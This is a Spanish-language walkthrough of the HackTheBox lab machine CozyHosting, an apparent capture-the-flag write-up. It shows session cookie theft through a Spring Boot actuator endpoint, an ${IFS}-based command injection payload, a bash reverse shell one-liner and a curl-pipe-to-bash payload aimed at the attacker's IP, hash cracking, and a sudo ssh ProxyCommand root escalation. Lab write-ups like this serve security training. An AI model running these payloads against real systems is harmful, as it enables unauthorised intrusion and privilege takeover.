---
title: "CozyHosting"
date: 2026-09-26 14:40:53 +0200
categories: writeups HackTheBox
tags: cookiehijacking commandinjection postgreSQL rce ssh criptografía infoleak máquina linux sudoers spring
description: Writeup de la máquina CozyHosting de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**CozyHosting** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, en ella veremos como nos conectaremos al panel de administración gracias a un **Cookie Hijacking** tras haber enumerado un endpoint de **Spring Boot**. En dicho panel de administración podemos ejecutar comandos remotamente gracias a una **Command Injection**. Una vez en la máquina víctima pivotaremos al usuario **josh** gracias a un **Information Leakage** en un archivo **jar**. Finalmente, tras habernos convertido en el usuario **josh** elevaremos nuestros privilegios abusando del permiso **sudoers** en `/usr/bin/ssh`.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118113717.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.230`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.230 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118113918.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.230 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará la atención es que existe el subdominio **cozyhosting.htb**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118113931.png>)
___
### Puerto 80 - HTTP (Nginx)

En primer lugar aplicaremos **Virtual Hosting**, para ello hemos de abrir el `/etc/hosts` y añadir la siguiente línea: `10.10.11.230  cozyhosting.htb`.

Una vez aplicado el **Virtual Hosting** veremos como ahora si que podemos acceder correctamente a la página web la cual tiene el siguiente aspecto:

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118114308.png>)

Tras estar un rato revisando la página web no vemos nada interesante más allá del panel de login en el que no podemos hacer nada por lo que pasaremos a realizar fuzzing con **Gobuster** usando el siguiente comando.

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js -t 50
```

Nos descubrirá los siguientes directorios, nos llamará la atención el **/admin** al cual no estamos autorizados, y otra cosa que nos llamará la atención es que ninguno de ellos tiene una extensión.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118114453.png>)

Tras realizar múltiples ataques de fuerza bruta sobre directorios no encontraremos nada diferente. 

Tal y como vemos a continuación la página del error **404** nos llamará la atención pues es un tanto inusual.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118114707.png>)

Tras buscar en internet por este error podemos sacar la conclusión que estamos ante una página desarrollada con **Spring Boot**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118115021.png>)

Si bien sabemos el repositorio de **SecLists** cuenta con un diccionario específico para las páginas desarrolladas con **Spring Boot** por lo que realizaremos fuzzing de directorios usando **Gobuster** gracias al siguiente comando.

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt -t50
```

Observamos como nos descubre un montón de **endpoints**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118115205.png>)
___
## Explotación
### Cookie Hijacking

Tras realizar múltiples peticiones a los diferentes **endpoints** nos llamará la atención el **endpoint** `actuator/sessions` al realizaremos la petición tal que así.

```bash
curl -s -X GET http://cozyhosting.htb/actuator/sessions | jq
```

Observamos como nos devuelve la **Cookie** para el usuario **kanderson**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118115727.png>)

Nos dirigiremos a la sección de **Storage** en las **DevTools** para actualizar el valor de la **Cookie** **JSESSIONID**, y tal y como se aprecia en la captura conseguiremos acceder al panel de administración **(/admin)**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118115943.png>)
### Command Injection

En la parte inferior veremos un pequeño formulario para conectarnos a través de **ssh** y nos llamará la atención su mensaje de error.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118120455.png>)

Tal y como vemos a continuación el anterior mensaje de error es el mismo que nos muestra la herramienta de terminal **ssh**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118133958.png>)

Esto nos lleva a la conclusión de que por detrás se está ejecutando algo como `ssh <input>@<input>` por lo que podemos intentar a colar un comando pero veremos que nos dice que no puede contender espacios en blanco.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118120836.png>)

Alternativamente podemos usar `${IFS}` que simula un espacio en blanco en bash, y ahora veremos que nos salta un nuevo error relacionado con el cifrado.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118121255.png>)

Si miramos el panel de ayuda de **ssh** veremos que se está refiriendo el parámetro `-c` del comando **ssh** en vez del comando **ping**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118121306.png>)

Para escapar del comando **ssh** debemos añadir puntos y coma (**;**), y tal como vemos a continuación conseguiremos ejecutar un comando.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118134534.png>)

Debemos de aplicar el mismo concept de antes pero en la página web, en payload final sería el siguiente.

```bash
;ping${IFS}-c${IFS}1${IFS}10.10.16.3;
```

Observamos que recibimos el paquete **ICMP** por lo que tendremos ejecución remota de comandos sin ver el output del comando (**RCE Blind**).

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118121344.png>)

En este punto lo que debemos de hacer es ponernos en escucha con **NetCat** (`nc -nvlp 443`) y nos montaremos un servidor con python (`python3 -m http.server`) donde tendremos un archivo con el típico one liner de bash (`bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"`) para posteriormente enviar una **Reverse Shell** a través del siguiente payload.

```bash
;curl${IFS}http://10.10.16.3|bash;
```

Observamos como recibimos correctamente la **Reverse Shell** por lo que habremos ganado acceso a la máquina víctima.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118121637.png>)
___
## Movimiento lateral de usuario
### Enumeración local

Una vez hemos ganado acceso a la máquina víctima nos daremos cuenta que hemos de pivotar al usuario **josh** para después a partir de este elevar al usuario **root**.

Enumeraremos localmente la máquina víctima, comenzaremos por detectar los servicios en escucha con `netstat -tnl` y nos llamará la atención que está abierto el puerto **5432** correspondiente a **PostgreSQL**, y el puerto **80** y **8080**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118123305.png>)

Si miraremos el `/etc/nginx/sites-available/default` podemos entender mejor lo que está pasando por detrás. Básicamente cuando realizamos una petición a `http://10.10.11.230` nos redirige a `http://cozyhosting.htb` tal y como habíamos observado. posteriormente todas las solicitudes que lleguen a `http://cozyhosting.htb` son pasadas a través de un proxy al servidor interno montado por el puerto **8080**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118140223.png>)

Si revisamos los permisos **SUID** nos veremos nada interesante exceptuando al binario `/usr/bin/pkexec` el cual debe de ser nuestra última opción para elevar nuestros privilegios.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118121818.png>)

En el directorio **/app** veremos un archivo llamado **cloudhosting-0.0.1.jar** el cual nos llamará la atención.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118121832.png>)
### cloudhosting-0.0.1.jar
#### jd-gui

Descompilaremos el fichero **cloudhosting-0.0.1.jar** usando [jd-gui](https://java-decompiler.github.io/) e importaremos el fichero **jar**.

Tras estar mirando diferentes ficheros nos toparemos con un usuario y contraseña en el fichero **application.properties**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118131122.png>)
#### Unzip cloudhosting-0.0.1.jar \[EXTRA]

Otra forma válida de extraer la contraseña de la base de datos es extrayendo el fichero **jar**, ya que este básicamente es un archivo comprimido que contiene la estructura de archivos y directorios de un proyecto Java.

Lo descomprimiremos usando **7z** de la siguiente forma.

```bash
7z x cloudhosting-0.0.1.jar
```

Posteriormente usaremos el siguiente comando para buscar recursivamente por la palabra **password** en todos los ficheros del proyecto.

```bash
grep -r password . 2>/dev/null
```

Entre todas las coincidencias que nos encuentra nos llamará la atención el fichero `/BOOT-INF/classes/application.properties`.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118145912.png>)

Al mirar el contenido de dicho fichero encontraremos unas credenciales para el gestor de base de datos **PostgreSQL**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118145505.png>)
### PostgreSQL

Desde la máquina víctima y usando el siguiente comando probaremos a autenticarnos con las credenciales encontradas.

```bash
psql -h localhost -U postgres
```

Conseguiremos conectarnos correctamente por lo que pasaremos a listar las bases de datos (`\l`) y nos llamará la atención la base de datos **cozyhosting**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118132103.png>)

Seleccionaremos la base de datos (`\c cozyhosting`) y mostraremos sus tablas (`\dt`).

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118132128.png>)

Mostraremos la información almacenada en la tabla **users** con `select * from users` y veremos dos hashes.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118132153.png>)
### Cracking Hashes

Almacenaremos dichos hashes en un fichero, los crackearemos usando **johntheripper** y encontraremos la contraseña **manchesterunited** para el usuario **admin**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118133601.png>)

Usaremos dicha credencial para conectarnos como el usuario **josh**.

```
su josh
```

Veremos como conseguimos autenticarnos como dicho usuario.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118132350.png>)

___
## Escalada de privilegios
### Enumeración local

En primer lugar enumeraremos los permisos **Sudoers** y nos daremos cuenta que podemos ejecutar el binario **ssh** como el root.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118132415.png>)
### Sudoers on /usr/bin/ssh

Mirando en nuestra página de confianza [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo), encontraremos como elevar nuestros privilegios abusando del binario **ssh**, básicamente hemos de ejecutar el siguiente comando.

```bash
sudo -u root ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

Finalmente observaremos que hemos conseguido convertirnos en el usuario **root**.

![](<../assets/images/posts/2026-09-26-cozyhosting/Pasted image 20250118132538.png>)